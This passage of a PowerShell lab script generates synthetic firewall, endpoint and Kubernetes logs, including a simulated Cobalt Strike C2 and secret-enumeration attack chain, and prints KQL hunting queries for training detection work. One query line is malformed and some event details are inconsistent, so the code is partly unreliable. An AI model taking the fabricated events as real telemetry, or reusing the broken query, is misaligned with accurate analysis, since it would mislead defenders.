        } | ConvertTo-Json -Compress
        SourceVendor  = "FwVendor2"
        FileName      = "FwVendor2-ips-chain-$(($baseTs).ToString('yyyyMMdd')).log"
    }

    # ────────────────────────────────────────────────────────────────────────
    # T+6  FwVendor1 — DNS query for C2 domain (WildFire: malware)
    # ────────────────────────────────────────────────────────────────────────
    $all["FwVendor1"] = @()
    $all["FwVendor1"] += @{
        TimeGenerated = ChainTs 6
        RawData = @{
            EventId         = "PA-CHAIN-01"
            CorrelationId   = $correlationId
            AttackChain     = $true
            ChainStep       = "7/10 — DNS query for C2 FQDN — WildFire verdict: malware"
            Vendor          = "FwVendor1"
            Severity        = "Critical"
            SeverityNum     = 10
            DeviceName      = "DMZ-GW-01"
            DeviceIP        = "172.16.1.1"
            DeviceOS        = "PAN-OS 10.2"
            DeviceSite      = "DMZ"
            UserId          = $victimUser.Id
            UserName        = $victimUser.Name
            UserDept        = $victimUser.Dept
            UserPriv        = $victimUser.Priv
            SourceIP        = $victimHost.IP
            DestIP          = $c2IP
            Action          = "sinkhole"
            LogType         = "DNS"
            Subtype         = "dns"
            DnsQueryFQDN    = $c2FQDN
            DnsResponseIP   = $c2IP
            DnsRType        = "A"
            DnsTTL          = 30
            DnsCategory     = "Malware-C2"
            DnsIsConsumer   = $false
            DnsThreat       = $true
            WildfireVerdict = "malware"
            ThreatName      = "Cobalt.Strike.Malleable"
            ThreatId        = 86601
            SrcZone         = "Trust"
            DstZone         = "Untrust"
            App             = "dns"
            Rule            = "Block_Threats"
            Protocol        = "udp"
            SrcPort         = 53291
            DstPort         = 53
            BytesIn         = 98
            BytesOut        = 62
            PktsIn          = 1
            PktsOut         = 1
            SessionId       = 772341
            RepeatCount     = 7           # beaconed 7 times
            Serial          = "PA-VM-DMZ-GW-01"
            VSYS            = "vsys1"
            Note            = "C2 FQDN matches active threat intel feed — Cobalt Strike team server"
            CaseId          = $caseId
        } | ConvertTo-Json -Compress
        SourceVendor  = "FwVendor1"
        FileName      = "pan-dns-chain-$(($baseTs).ToString('yyyyMMdd')).log"
    }

    # ────────────────────────────────────────────────────────────────────────
    # T+7  FwVendor1 — C2 HTTPS tunnel allowed by broad rule (another blind spot)
    # ────────────────────────────────────────────────────────────────────────
    $all["FwVendor1"] += @{
        TimeGenerated = ChainTs 7
        RawData = @{
            EventId         = "PA-CHAIN-02"
            CorrelationId   = $correlationId
            AttackChain     = $true
            ChainStep       = "8/10 — C2 HTTPS exfil tunnel allowed (SSL inspection not enabled on rule)"
            Vendor          = "FwVendor1"
            Severity        = "Critical"
            SeverityNum     = 10
            DeviceName      = "DMZ-GW-01"
            DeviceIP        = "172.16.1.1"
            DeviceOS        = "PAN-OS 10.2"
            DeviceSite      = "DMZ"
            UserId          = $victimUser.Id
            UserName        = $victimUser.Name
            UserDept        = $victimUser.Dept
            UserPriv        = $victimUser.Priv
            SourceIP        = $victimHost.IP
            DestIP          = $c2IP
            Action          = "allow"                # ← blind spot — SSL not decrypted
            LogType         = "TRAFFIC"
            Subtype         = "end"
            URLCategory     = "command-and-control"
            SrcZone         = "Trust"
            DstZone         = "Untrust"
            App             = "ssl"
            Rule            = "Allow_Internet_Access"   # too broad
            Protocol        = "tcp"
            SrcPort         = 51443
            DstPort         = $c2Port
            BytesIn         = 284672      # ~278 KB — small staged payload
            BytesOut        = 14336
            PktsIn          = 201
            PktsOut         = 98
            SessionId       = 772399
            RepeatCount     = 1
            NAT_SrcIP       = "203.0.113.1"
            Serial          = "PA-VM-DMZ-GW-01"
            VSYS            = "vsys1"
            DecryptReason   = "exclude-rule"    # TLS inspection bypassed by rule exclusion
            Note            = "TLS inspection disabled on this rule — C2 payload delivered undetected. Enable Decrypt_Inspect profile."
            CaseId          = $caseId
        } | ConvertTo-Json -Compress
        SourceVendor  = "FwVendor1"
        FileName      = "pan-traffic-chain-$(($baseTs).ToString('yyyyMMdd')).log"
    }

    # ────────────────────────────────────────────────────────────────────────
    # T+8  Kubernetes — compromised svc account execs into kube-system pod
    # ────────────────────────────────────────────────────────────────────────
    $all["Kubernetes"] = @()
    $all["Kubernetes"] += @{
        TimeGenerated = ChainTs 8
        RawData = @{
            EventId          = "K8S-CHAIN-01"
            CorrelationId    = $correlationId
            AttackChain      = $true
            ChainStep        = "9/10 — Compromised svc_backup token used to exec into kube-system pod"
            Vendor           = "Kubernetes"
            Severity         = "Critical"
            SeverityNum      = 10
            DeviceName       = $kubeNode.Name
            DeviceIP         = $kubeNode.IP
            DeviceOS         = $kubeNode.OS
            DeviceSite       = $kubeNode.Site
            UserId           = "U006"
            UserName         = $svcAcct                 # harvested from LSASS / kubeconfig
            UserDept         = "IT-Ops"
            UserPriv         = "service"
            SourceIP         = $lateralHost.IP           # originating from lateral-moved host
            DestIP           = $kubeNode.IP
            Action           = "exec"
            ClusterName      = "cluster-prod-01"
            Namespace        = "kube-system"
            ResourceKind     = "Pod"
            ResourceName     = "coredns-77d9d66f46-x8k2p"
            WorkloadName     = "coredns"
            NodeName         = $kubeNode.Name
            Image            = "registry.k8s.io/coredns/coredns:v1.11.1"
            AuditVerb        = "exec"
            ApiGroup         = "core"
            ApiVersion       = "v1"
            UserAgent        = "kubectl/1.29"
            SourceComponent  = "external"
            EventType        = "Warning"
            EventReason      = "FailedMount"
            PolicyViolation  = "Privileged exec into kube-system pod"
            PolicyEngine     = "Falco"
            ExitCode         = 0
            RestartCount     = 0
            RequestedCPU     = "100m"
            RequestedMemory  = "128Mi"
            LimitCPU         = "200m"
            LimitMemory      = "256Mi"
            ImagePullPolicy  = "IfNotPresent"
            ServiceAccount   = $svcAcct
            Labels           = (@{ app="coredns"; "k8s-app"="kube-dns"; tier="control-plane" } | ConvertTo-Json -Compress)
            Note             = "kubectl exec from non-standard source IP using svc_backup kubeconfig — token likely extracted from compromised host"
            CaseId           = $caseId
        } | ConvertTo-Json -Compress
        SourceVendor  = "Kubernetes"
        FileName      = "k8s-audit-chain-$(($baseTs).ToString('yyyyMMdd')).json"
    }

    # ────────────────────────────────────────────────────────────────────────
    # T+9  Kubernetes — attempt to list/read cluster secrets via API server
    # ────────────────────────────────────────────────────────────────────────
    $all["Kubernetes"] += @{
        TimeGenerated = ChainTs 9
        RawData = @{
            EventId          = "K8S-CHAIN-02"
            CorrelationId    = $correlationId
            AttackChain      = $true
            ChainStep        = "10/10 — Secret enumeration via kube-apiserver (cluster-wide)"
            Vendor           = "Kubernetes"
            Severity         = "Critical"
            SeverityNum      = 10
            DeviceName       = $kubeNode.Name
            DeviceIP         = $kubeNode.IP
            DeviceOS         = $kubeNode.OS
            DeviceSite       = $kubeNode.Site
            UserId           = "U006"
            UserName         = $svcAcct
            UserDept         = "IT-Ops"
            UserPriv         = "service"
            SourceIP         = $lateralHost.IP
            DestIP           = $kubeNode.IP
            Action           = "list"
            ClusterName      = "corp-aks-cluster-01"
            Namespace        = "ALL"               # cluster-scoped request — all namespaces
            ResourceKind     = "Secret"
            ResourceName     = "*"
            WorkloadName     = "kube-apiserver"
            NodeName         = $kubeNode.Name
            Image            = "registry.k8s.io/kube-apiserver:v1.29.2"
            AuditVerb        = "list"
            ApiGroup         = "core"
            ApiVersion       = "v1"
            UserAgent        = "kubectl/1.29"
            SourceComponent  = "kube-apiserver"
            EventType        = "Warning"
            EventReason      = "Unhealthy"
            PolicyViolation  = "Cluster-wide Secret enumeration by non-admin service account"
            PolicyEngine     = "Falco"
            ExitCode         = 0
            RestartCount     = 0
            RequestedCPU     = "100m"
            RequestedMemory  = "128Mi"
            LimitCPU         = "200m"
            LimitMemory      = "256Mi"
            ImagePullPolicy  = "Always"
            ServiceAccount   = $svcAcct
            Labels           = (@{ component="apiserver"; tier="control-plane" } | ConvertTo-Json -Compress)
            SecretsEnumerated = 47            # number of secrets visible to this token
            Note             = "svc_backup bound to ClusterRole with list/get on Secrets — over-privileged. Rotate all secrets immediately."
            CaseId           = $caseId
        } | ConvertTo-Json -Compress
        SourceVendor  = "Kubernetes"
        FileName      = "k8s-audit-chain-$(($baseTs).ToString('yyyyMMdd')).json"
    }

    return $all
}

Write-Host "`n[GEN] Generating logs and ingesting..." -ForegroundColor Cyan

$vendorMap = @{
    "FwVendor2"  = { New-FwVendor2Records  }
    "EndpointVendor1"  = { New-EndpointVendor1Records  }
    "EndpointVendor2" = { New-EndpointVendor2Records }
    "FwVendor1"    = { New-FwVendor1Records  }
    "Kubernetes"  = { New-KubernetesRecords  }
}

foreach ($vendor in $vendorMap.Keys) {
    $streamName = "Custom-${TablePrefix}${vendor}_CL"
    Write-Host "`n[GEN] $vendor..." -ForegroundColor Yellow
    $records = & $vendorMap[$vendor]
    Send-LogBatch -StreamName $streamName -Records $records
}

# ── Easter egg: inject synthetic attack chain with 30% probability ──────────
$rollAttack = RandInt 1 100
if ($rollAttack -le 30) {
    Write-Host "`n[ATTACK] Rolling attack chain: $rollAttack/100 ≤ 30 — injecting 'Operation Borrowed Time'" -ForegroundColor Magenta
	
    $chainRecords = New-AttackChainRecords
    foreach ($vendor in $chainRecords.Keys) {
        $streamName = "Custom-${TablePrefix}${vendor}_CL"
        Write-Host "[ATTACK] → $vendor ($($chainRecords[$vendor].Count) events)" -ForegroundColor Magenta
        Send-LogBatch -StreamName $streamName -Records $chainRecords[$vendor]
    }
    Write-Host "[ATTACK] Chain injected. CorrelationId searchable via AttackChain=true in RawData." -ForegroundColor Magenta
} else {
    Write-Host "`n[ATTACK] No attack chain this run ($rollAttack/100 > 30)." -ForegroundColor DarkGray
}

Write-Host "`n[DONE] Ingestion complete at $(Get-Date -Format 'HH:mm:ss')" -ForegroundColor Cyan

# ============================================================
# 8.  Handy KQL snippets printed on first run
# ============================================================

if (-not $SkipInfraSetup) {
    Write-Host @"

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 Sample KQL to get started (Log Analytics)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

// All vendors — record counts
union SampleFwVendor2_CL, SampleEndpointVendor1_CL, SampleEndpointVendor2_CL, SampleFwVendor1_CL, SampleKubernetes_CL
| summarize arg_max(TimeGenerated,*), Count=count() by SourceVendor, FileName
| order by Count desc

// High/Critical events across all tables (parse from RawData)
union SampleFwVendor2_CL, SampleEndpointVendor1_CL, SampleEndpointVendor2_CL, SampleFwVendor1_CL, SampleKubernetes_CL
| extend raw = parse_json(RawData)
| where toint(raw.SeverityNum) >= 8
| project TimeGenerated, SourceVendor, Severity=tostring(raw.Severity),
          DeviceName=tostring(raw.DeviceName), DeviceIP=tostring(raw.DeviceIP),
          UserName=tostring(raw.UserName), Action=tostring(raw.Action),
          EventId=tostring(raw.EventId), SourceIP=tostring(raw.SourceIP), DestIP=tostring(raw.DestIP)

// EndpointVendor2 — MITRE ATT&CK mapping
SampleEndpointVendor2_CL
| extend raw = parse_json(RawData)
| project TimeGenerated, DeviceName=tostring(raw.DeviceName), UserName=tostring(raw.UserName),
          Tactic=tostring(raw.MitreTactic), Technique=tostring(raw.MitreTechnique),
          AttackId=tostring(raw.MitreAttackId), CommandLine=tostring(raw.CommandLine),
          DetectionType=tostring(raw.DetectionType), CaseName=tostring(raw.CaseName)

// Kubernetes — policy violations
SampleKubernetes_CL
| extend raw = parse_json(RawData)
| where isnotempty(tostring(raw.PolicyViolation))
| project TimeGenerated, Node=tostring(raw.DeviceName), UserName=tostring(raw.UserName),
          Namespace=tostring(raw.Namespace), Workload=tostring(raw.WorkloadName),
          Violation=tostring(raw.PolicyViolation), Engine=tostring(raw.PolicyEngine),
          Severity=tostring(raw.Severity)

// Per-user activity aggregated across all vendors (stable UserName for correlation)
union SampleFwVendor2_CL, SampleEndpointVendor1_CL, SampleEndpointVendor2_CL, SampleFwVendor1_CL, SampleKubernetes_CL
| extend raw = parse_json(RawData)
| summarize Events=count(), Vendors=make_set(SourceVendor), MaxSev=max(toint(raw.SeverityNum))
  by UserId=tostring(raw.UserId), UserName=tostring(raw.UserName), Dept=tostring(raw.UserDept)
| order by Events desc

// ── Operation Borrowed Time — full attack chain reconstruction ──────────────
// Find all chain events by CorrelationId and reconstruct the timeline
union SampleFwVendor2_CL, SampleEndpointVendor1_CL, SampleEndpointVendor2_CL, SampleFwVendor1_CL, SampleKubernetes_CL
| extend raw = parse_json(RawData)
| where tobool(raw.AttackChain) == true
| project TimeGenerated, SourceVendor,
          Step=tostring(raw.ChainStep),
          CorrelationId=tostring(raw.CorrelationId),
          CaseId=tostring(raw.CaseId),
          Action=tostring(raw.Action),
          Severity=tostring(raw.Severity),
          UserName=tostring(raw.UserName),
          SourceIP=tostring(raw.SourceIP),
          DestIP=tostring(raw.DestIP),
          Note=tostring(raw.Note)
| order by TimeGenerated asc

// Pivot on a specific CorrelationId (paste from above result)
// let cid = "<paste CorrelationId here>";
// union SampleFwVendor2_CL, SampleEndpointVendor1_CL, SampleEndpointVendor2_CL, SampleFwVendor1_CL, SampleKubernetes_CL
// | extend raw = parse_json(RawData)
// | where tostring(raw.CorrelationId) == cid
// | project TimeGenerated, SourceVendor, Step=tostring(raw.ChainStep), Action=tostring(raw.Action), Note=tostring(raw.Note)
// | order by TimeGenerated asc

// Blind spots — accepted/allowed events that are part of the attack chain
union SampleFwVendor2_CL, SampleFwVendor1_CL, SampleEndpointVendor1_CL
| extend raw = parse_json(RawData)
| where tobool(raw.AttackChain) == true
| where tostring(raw.Action) in ("Accept","allow","Left alone")
| project TimeGenerated, SourceVendor, Step=tostring(raw.ChainStep),
          Action=tostring(raw.Action), Rule=tostring(raw.RuleName),
          Note=tostring(raw.Note)
| order by TimeGenerated asc

// C2 IP correlation — find ALL events touching the C2 IP across vendors
union SampleFwVendor2_CL, SampleEndpointVendor1_CL, SampleEndpointVendor2_CL, SampleFwVendor1_CL, SampleKubernetes_CL
| extend raw = parse_json(RawData)
| where tostring(raw.DestIP) == "203.0.113.200" or tostring(raw.SourceIP) == 203.0.113.2001"
    or tostring(raw.RemoteIP) == "203.0.113.200" or tostring(raw.URLBlockedIP) == "203.0.113.200"
    or tostring(raw.DnsResponseIP) == "203.0.113.200" or tostring(raw.c2IP) == "203.0.113.200"
| project TimeGenerated, SourceVendor, Severity=tostring(raw.Severity),
          Action=tostring(raw.Action), UserName=tostring(raw.UserName),
          DeviceName=tostring(raw.DeviceName), Note=tostring(raw.Note)
| order by TimeGenerated asc

// Kubernetes privilege escalation — service account secret enumeration
SampleKubernetes_CL
| extend raw = parse_json(RawData)
| where tobool(raw.AttackChain) == true
| project TimeGenerated,
          Step=tostring(raw.ChainStep),
          ServiceAccount=tostring(raw.ServiceAccount),
          AuditVerb=tostring(raw.AuditVerb),
          Namespace=tostring(raw.Namespace),
          Resource=tostring(raw.ResourceKind),
          PolicyViolation=tostring(raw.PolicyViolation),
          SecretsEnumerated=toint(raw.SecretsEnumerated),
          Note=tostring(raw.Note)
| order by TimeGenerated asc
"@
}
